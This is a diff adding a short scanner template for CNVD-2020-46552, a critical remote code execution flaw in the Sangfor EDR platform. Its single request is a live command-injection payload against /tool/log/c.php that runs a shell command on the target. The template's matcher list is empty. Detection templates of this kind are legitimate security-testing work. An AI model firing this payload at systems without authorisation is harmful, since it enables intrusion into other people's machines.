@@ -1,0 +1,18 @@
+id: CNVD-2020-46552
+brief:
+    title: Sangfor EDR - Remote Code Execution
+    by: ritikchaddha
+    level: critical
+    about: Sangfor Endpoint Monitoring and Response Platform (EDR) contains a remote code execution vulnerability. An attacker could exploit this vulnerability by constructing an HTTP request which could exec...
+    label:
+        - cnvd
+        - cnvd2020
+        - sangfor
+        - rce
+        - vuln
+    score: CVSS:10.0
+moves:
+    - verb: GET
+      to:
+        - '{{BaseURL}}/tool/log/c.php?strip_slashes=printf&host=nl+c.php'
+      signs: []
